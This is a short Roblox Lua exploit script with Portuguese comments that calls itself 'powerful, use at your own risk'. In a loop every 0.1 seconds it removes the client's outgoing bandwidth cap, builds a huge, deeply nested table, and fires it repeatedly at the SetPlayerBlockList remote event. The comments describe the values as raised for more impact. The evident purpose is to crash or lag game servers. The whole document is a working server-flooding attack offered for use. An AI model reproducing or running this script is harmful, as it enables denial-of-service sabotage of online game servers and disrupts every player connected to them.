-- Script potente, use por sua conta e risco!
while wait(0.1) do -- Aumentei a frequência para 0.1 segundos
    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)

    local function getmaxvalue(val)
        local mainvalueifonetable = 999999 -- Aumentei o valor para criar tabelas maiores
        if type(val) ~= "number" then
            return nil
        end
        local calculateperfectval = (mainvalueifonetable / (val + 1))
        return calculateperfectval
    end

    local function bomb(tableincrease, tries)
        local maintable = {}
        local spammedtable = {}

        table.insert(spammedtable, {})
        local z = spammedtable[1]

        for i = 1, tableincrease * 2 do -- Aumentei a profundidade da tabela
            local tableins = {}
            table.insert(z, tableins)
            z = tableins
        end

        local calculatemax = getmaxvalue(tableincrease)
        local maximum = calculatemax or 1999999 -- Limite aumentado

        for i = 1, maximum do
            table.insert(maintable, spammedtable)
        end

        for i = 1, tries * 5 do -- Aumentei o número de tentativas
            game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(maintable)
        end
    end

    bomb(500, 10) -- Valores aumentados para mais impacto
end
